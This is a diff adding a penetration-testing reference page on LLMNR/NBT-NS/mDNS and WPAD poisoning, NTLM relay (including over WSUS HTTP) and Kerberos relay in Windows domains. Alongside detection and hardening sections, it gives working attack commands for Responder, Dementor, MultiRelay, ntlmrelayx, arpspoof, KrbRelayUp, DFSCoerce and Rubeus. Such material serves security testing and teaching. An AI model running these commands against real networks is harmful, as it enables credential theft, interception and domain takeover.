@@ -1,0 +1,338 @@
+# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks
+
+## Network Protocols
+
+### Local Host Resolution Protocols
+
+- **LLMNR, NBT-NS, and mDNS**:
+  - Microsoft and other operating systems use LLMNR and NBT-NS for local name resolution when DNS fails. Similarly, Apple and Linux systems use mDNS.
+  - These protocols are susceptible to interception and spoofing due to their unauthenticated, broadcast nature over UDP.
+  - [Responder](https://github.com/lgandx/Responder) and [Dementor](https://github.com/MatrixEditor/Dementor) can be used to impersonate services by sending forged responses to hosts querying these protocols.
+  - Further information on service impersonation using Responder can be found [here](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).
+
+### Web Proxy Auto-Discovery Protocol (WPAD)
+
+- WPAD allows browsers to discover proxy settings automatically.
+- Discovery is facilitated via DHCP, DNS, or fallback to LLMNR and NBT-NS if DNS fails.
+- Responder can automate WPAD attacks, directing clients to malicious WPAD servers.
+
+### Responder/Dementor for Protocol Poisoning
+
+- **Responder** is a tool used for poisoning LLMNR, NBT-NS, and mDNS queries, selectively responding based on query types, primarily targeting SMB services.
+- It comes pre-installed in Kali Linux, configurable at `/etc/responder/Responder.conf`.
+- Responder displays captured hashes on the screen and saves them in the `/usr/share/responder/logs` directory.
+- It supports both IPv4 and IPv6.
+- Windows version of Responder is available [here](https://github.com/lgandx/Responder-Windows).
+
+- **Dementor** expands on the topics of multicast poisoning and additionally acts as a rogue service provider (including CUPS RCE support)
+- Overall structure is similar to **Responder** with more granular configuration. (default is here: [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
+- Compatibility between **Dementor** and **Responder** is given here: [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
+- Intro and Documentation here: [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
+- Fixes capture issues introduced by Responder on certain protocols
+
+#### Running Responder
+
+- To run Responder with default settings: `responder -I <Interface>`
+- For more aggressive probing (with potential side effects): `responder -I <Interface> -P -r -v`
+- Techniques to capture NTLMv1 challenges/responses for easier cracking: `responder -I <Interface> --lm --disable-ess`
+- WPAD impersonation can be activated with: `responder -I <Interface> --wpad`
+- NetBIOS requests can be resolved to the attacker's IP, and an authentication proxy can be set up: `responder.py -I <interface> -Pv`
+
+#### Running Dementor
+
+- With detault settings applied: `Dementor -I <interface>`
+- With default settings in analysis mode: `Dementor -I <interface> -A`
+- Automatic NTLM session downgrade (ESS): `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
+- Run current session with custom config: `Dementor -I <interface> --config <file.toml>`
+
+### DHCP Poisoning with Responder
+
+- Spoofing DHCP responses can permanently poison a victim's routing information, offering a stealthier alternative to ARP poisoning.
+- It requires precise knowledge of the target network's configuration.
+- Running the attack: `./Responder.py -I eth0 -Pdv`
+- This method can effectively capture NTLMv1/2 hashes, but it requires careful handling to avoid network disruption.
+
+### Capturing Credentials with Responder/Dementor
+
+- Responder/Dementor will impersonate services using the above-mentioned protocols, capturing credentials (usually NTLMv2 Challenge/Response) when a user attempts to authenticate against the spoofed services.
+- Attempts can be made to downgrade to NetNTLMv1 or disable ESS for easier credential cracking.
+
+If you already have a **writable SMB share that victims browse**, you can coerce outbound SMB without spoofing by planting UNC-based lure files (SCF/LNK/library-ms/desktop.ini/Office) generated with ntlm_theft, then catching the authentication with Responder. See the [Explorer-triggered UNC lure workflow](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#writable-smb-share--explorer-triggered-unc-lures-ntlm_theftscflnklibrary-msdesktopini).
+
+It's crucial to note that employing these techniques should be done legally and ethically, ensuring proper authorization and avoiding disruption or unauthorized access.
+
+## Inveigh
+
+Inveigh is a tool for penetration testers and red teamers, designed for Windows systems. It offers functionalities similar to Responder, performing spoofing and man-in-the-middle attacks. The tool has evolved from a PowerShell script to a C# binary, with [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) and [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) as the main versions. Detailed parameters and instructions can be found in the [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).
+
+Inveigh can be operated through PowerShell:
+
+```bash
+Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+
+Or executed as a C# binary:
+
+```bash
+Inveigh.exe
+```
+
+### NTLM Relay Attack
+
+This attack leverages SMB authentication sessions to access a target machine, granting a system shell if successful. Key prerequisites include:
+
+- The authenticating user must have Local Admin access on the relayed host.
+- SMB signing should be disabled.
+
+#### 445 Port Forwarding and Tunneling
+
+In scenarios where direct network introduction isn't feasible, traffic on port 445 needs to be forwarded and tunneled. Tools like [**PortBender**](https://github.com/praetorian-inc/PortBender) help in redirecting port 445 traffic to another port, which is essential when local admin access is available for driver loading.
+
+PortBender setup and operation in Cobalt Strike:
+
+```bash
+Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)
+
+beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
+beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
+beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
+beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
+beacon> socks 1080 # Establish a SOCKS proxy on port 1080
+
+# Termination commands
+beacon> jobs
+beacon> jobkill 0
+beacon> rportfwd stop 8445
+beacon> socks stop
+```
+
+### Other Tools for NTLM Relay Attack
+
+- **Metasploit**: Set up with proxies, local and remote host details.
+- **smbrelayx**: A Python script for relaying SMB sessions and executing commands or deploying backdoors.
+- **MultiRelay**: A tool from the Responder suite to relay specific users or all users, execute commands, or dump hashes.
+
+Each tool can be configured to operate through a SOCKS proxy if necessary, enabling attacks even with indirect network access.
+
+### MultiRelay Operation
+
+MultiRelay is executed from the _**/usr/share/responder/tools**_ directory, targeting specific IPs or users.
+
+```bash
+python MultiRelay.py -t <IP target> -u ALL # Relay all users
+python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
+python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes
+
+# Proxychains for routing traffic
+```
+
+### RelayKing – relayable target discovery and curated relay lists
+
+RelayKing is an NTLM relay **exposure auditor** that maps where relays are viable and produces ready-to-use target lists for `ntlmrelayx.py -tf`. It checks protocol hardening (SMB signing/channel binding; HTTP/HTTPS/MSSQL/LDAP/LDAPS EPA/CBT; RPC auth) and flags **coercion/reflection helpers** (PetitPotam/PrinterBug/DFSCoerce, WebClient/WebDAV, NTLMv1, CVE-2025-33073 reflection).
+
+- Auth improves reliability for HTTPS/LDAPS CBT and MSSQL EPA checks; SMB signing/signature level is probed unauthenticated.
+- Cross-protocol relay pathing leverages confirmed Net-NTLMv1 (`--ntlmv1`/`--ntlmv1-all`) findings; severity ranking is provided per path.
+- `--gen-relay-list <file>` writes a grep-friendly target list for `ntlmrelayx.py -tf <file>` to avoid trial-and-error.
+- `--coerce-all` mass-triggers PetitPotam/DFSCoerce/PrinterBug against all targets; `--ntlmv1-all` (RemoteRegistry) and `--audit` (domain-wide LDAP host pull) are **noisy** and generate many logons/remote accesses.
+- `--proto-portscan` speeds scanning by skipping closed ports; `--krb-dc-only` helps when DCs block NTLM but other services still accept it.
+
+Example sweeps:
+
+```bash
+# Authenticated audit across multiple protocols + generate relay list for ntlmrelayx
+python3 relayking.py -u lowpriv -p 'P@ssw0rd!' -d lab.local --dc-ip 10.0.0.10 \
+  --audit --protocols smb,ldap,ldaps,mssql,http,https --proto-portscan --ntlmv1 \
+  --threads 10 -vv -o plaintext,json --output-file relayking-scan --gen-relay-list relaytargets.txt
+
+# Unauthenticated CIDR sweep for SMB/LDAP/HTTP relayability
+python3 relayking.py --null-auth --protocols smb,ldap,http --proto-portscan -o plaintext 10.10.0.0/24
+```
+
+These tools and techniques form a comprehensive set for conducting NTLM Relay attacks in various network environments.
+
+### Abusing WSUS HTTP (8530) for NTLM Relay to LDAP/SMB/AD CS (ESC8)
+
+WSUS clients authenticate to their update server using NTLM over HTTP (8530) or HTTPS (8531). When HTTP is enabled, periodic client check-ins can be coerced or intercepted on the local segment and relayed with ntlmrelayx to LDAP/LDAPS/SMB or AD CS HTTP endpoints (ESC8) without cracking any hashes. This blends into normal update traffic and frequently yields machine-account authentications (HOST$).
+
+What to look for
+- GPO/registry configuration under HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate and ...\WindowsUpdate\AU:
+  - WUServer (e.g., http://wsus.domain.local:8530)
+  - WUStatusServer (reporting URL)
+  - UseWUServer (1 = WSUS; 0 = Microsoft Update)
+  - DetectionFrequencyEnabled and DetectionFrequency (hours)
+- WSUS SOAP endpoints used by clients over HTTP:
+  - /ClientWebService/client.asmx (approvals)
+  - /ReportingWebService/reportingwebservice.asmx (status)
+- Default ports: 8530/tcp HTTP, 8531/tcp HTTPS
+
+Reconnaissance
+- Unauthenticated
+  - Scan for listeners: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
+  - Sniff HTTP WSUS traffic via L2 MITM and log active clients/endpoints with wsusniff.py (HTTP only unless you can make clients trust your TLS cert).
+- Authenticated
+  - Parse SYSVOL GPOs for WSUS keys with MANSPIDER + regpol (wsuspider.sh wrapper summarises WUServer/WUStatusServer/UseWUServer).
+  - Query endpoints at scale from hosts (NetExec) or locally:
+    nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
+    reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
+
+End-to-end HTTP relay steps
+1) Position for MITM (same L2) so a client resolves the WSUS server to you (ARP/DNS poisoning, Bettercap, mitm6, etc.). Example with arpspoof:
+    arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>
+
+2) Redirect port 8530 to your relay listener (optional, convenient):
+    iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
+    iptables -t nat -L PREROUTING --line-numbers
+
+3) Start ntlmrelayx with the HTTP listener (requires Impacket support for HTTP listener; see PRs below):
+    ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530
+
+   Other common targets:
+   - Relay to SMB (if signing off) for exec/dump: -t smb://<host>
+   - Relay to LDAPS for directory changes (e.g., RBCD): -t ldaps://<DC>
+   - Relay to AD CS web enrollment (ESC8) to mint a cert and then authenticate via Schannel/PKINIT:
+        ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
+     For deeper AD CS abuse paths and tooling, see the AD CS page:
+
+4) Trigger a client check-in or wait for schedule. From a client:
+    wuauclt.exe /detectnow
+   or use the Windows Update UI (Check for updates).
+
+5) Use the authenticated SOCKS sessions (if -socks) or direct relay results for post-exploitation (LDAP changes, SMB ops, or AD CS certificate issuance for later authentication).
+
+HTTPS constraint (8531)
+- Passive interception of WSUS over HTTPS is ineffective unless clients trust your certificate. Without a trusted cert or other TLS break, the NTLM handshake can’t be harvested/relayed from WSUS HTTPS traffic.
+
+Notes
+- WSUS was announced deprecated but remains widely deployed; HTTP (8530) is still common in many environments.
+- Useful helpers: wsusniff.py (observe HTTP WSUS check-ins), wsuspider.sh (enumerate WUServer/WUStatusServer from GPOs), NetExec reg-query at scale.
+- Impacket restored HTTP listener support for ntlmrelayx in PR #2034 (originally added in PR #913).
+
+### Force NTLM Logins
+
+In Windows you **may be able to force some privileged accounts to authenticate to arbitrary machines**. Read the following page to learn how:
+
+## Kerberos Relay attack
+
+A **Kerberos relay attack** steals an **AP-REQ ticket** from one service and re-uses it against a second service that shares the **same computer-account key** (because both SPNs sit on the same `$` machine account). This works even though the SPNs’ **service classes differ** (e.g. `CIFS/` → `LDAP/`) because the *key* that decrypts the ticket is the machine’s NT hash, not the SPN string itself and the SPN string is not part of the signature.
+
+Unlike NTLM relay, the hop is limited to the *same host* but, if you target a protocol that lets you write to LDAP, you can chain into **Resource-Based Constrained Delegation (RBCD)** or **AD CS enrollment** and pop **NT AUTHORITY\SYSTEM** in a single shot.
+
+For detailed info about this attack check:
+
+- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
+- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)
+
+- 1. **Kerberos basics**
+
+| Token | Purpose | Relay relevance |
+|-------|---------|-----------------|
+| **TGT / AS-REQ ↔ REP** | Proves the user to the KDC | untouched |
+| **Service ticket / TGS-REQ ↔ REP** | Bound to one **SPN**; encrypted with the SPN owner’s key | interchangeable if SPNs share account |
+| **AP-REQ** | Client sends `TGS` to the service | **what we steal & replay** |
+
+* Tickets are encrypted with the **password-derived key of the account that owns the SPN**.
+* The **Authenticator** inside the AP-REQ has a 5-minute timestamp; replay inside that window is valid until the service cache sees a duplicate.
+* Windows rarely checks if the SPN string in the ticket matches the service you hit, so a ticket for `CIFS/HOST` normally decrypts fine on `LDAP/HOST`.
+
+- 2. **What must be true to relay Kerberos**
+
+1. **Shared key:** source and target SPNs belong to the same computer account (default on Windows servers).
+2. **No channel protection:** SMB/LDAP signing off and EPA off for HTTP/LDAPS.
+3. **You can intercept or coerce authentication:** LLMNR/NBNS poison, DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM, etc..
+4. **Ticket source not already used:** you win the race before the real packet hits or block it entirely; otherwise the server’s replay cache fires Event 4649.
+5. You need to somehow be able to perform a **MitM in the communication** maybe being part of the DNSAmins group to modify the DNS of the domain or being able to change the HOST file of the victim.
+
+### Kerberos Relay Steps
+
+- 3.1 **Recon the host**
+
+```powershell
+# find servers where HTTP, LDAP or CIFS share the same machine account
+Get-ADComputer -Filter * -Properties servicePrincipalName |
+  Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
+  Select Name,servicePrincipalName
+```
+
+- 3.2 **Start the relay listener**
+
+[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
+
+```powershell
+# one-click local SYSTEM via RBCD
+.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
+```
+`KrbRelayUp` wraps **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** in one binary.
+
+- 3.3 **Coerce Kerberos auth**
+
+```powershell
+# coerce DC to auth over SMB with DFSCoerce
+.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
+```
+DFSCoerce makes the DC send a Kerberos `CIFS/DC01` ticket to us.
+
+- 3.4 **Relay the AP-REQ**
+
+KrbRelay extracts the GSS blob from SMB, repackages it into an LDAP bind, and forwards it to `ldap://DC01`—authentication succeeds because the **same key** decrypts it.
+
+- 3.5 **Abuse LDAP ➜ RBCD ➜ SYSTEM**
+
+```powershell
+# (auto inside KrbRelayUp) manual for clarity
+New-MachineAccount -Name "FAKE01" -Password "P@ss123"
+KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
+Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
+SCMUACBypass.exe
+```
+You now own **NT AUTHORITY\SYSTEM**.
+
+### **More paths worth knowing**
+
+| Vector | Trick | Why it matters |
+|--------|-------|----------------|
+| **AuthIP / IPSec** | Fake server sends a **GSS-ID payload** with any SPN; client builds an AP-REQ straight to you | Works even across subnets; machine creds by default |
+| **DCOM / MSRPC** | Malicious OXID resolver forces client to auth to arbitrary SPN and port | Pure *local* priv-esc; sidesteps firewall |
+| **AD CS Web Enroll** | Relay machine ticket to `HTTP/CA` and get a cert, then **PKINIT** to mint TGTs | Bypasses LDAP signing defenses |
+| **Shadow Credentials** | Write `msDS-KeyCredentialLink`, then PKINIT with forged key pair | No need to add a computer account |
+
+### **Troubleshooting**
+
+| Error | Meaning | Fix |
+|-------|---------|-----|
+| `KRB_AP_ERR_MODIFIED` | Ticket key ≠ target key | Wrong host/SPN |
+| `KRB_AP_ERR_SKEW` | Clock > 5 min offset | Sync time or use `w32tm` |
+| LDAP bind fails | Signing enforced | Use AD CS path or disable signing |
+| Event 4649 spam | Service saw duplicate Authenticator | block or race original packet |
+
+### **Detection**
+
+* Surge in **Event 4769** for `CIFS/`, `HTTP/`, `LDAP/` from the same source within seconds.
+* **Event 4649** on the service indicates replay detected.
+* Kerberos logon from **127.0.0.1** (relay to local SCM) is highly suspicious—map via Sigma rule in KrbRelayUp docs.
+* Watch changes to `msDS-AllowedToActOnBehalfOfOtherIdentity` or `msDS-KeyCredentialLink` attributes.
+
+## **Hardening**
+
+1. **Enforce LDAP & SMB signing + EPA** on every server.
+2. **Split SPNs** so HTTP isn’t on the same account as CIFS/LDAP.
+3. Patch coercion vectors (PetitPotam KB5005413, DFS, AuthIP).
+4. Set **`ms-DS-MachineAccountQuota = 0`** to stop rogue computer joins.
+5. Alert on **Event 4649** and unexpected loopback Kerberos logons.
+
+## References
+
+- [HTB: Breach – Writable SMB share lures + Responder capture → NetNTLMv2 crack](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
+- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
+- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
+- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
+- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
+- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
+- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
+- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
+- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
+- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
+- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
+- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
+- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)
+- [RelayKing v1.0](https://github.com/depthsecurity/RelayKing-Depth)
+- [Depth Security – Introducing RelayKing: Relay to Royalty](https://www.depthsecurity.com/blog/introducing-relayking-relay-to-royalty/)
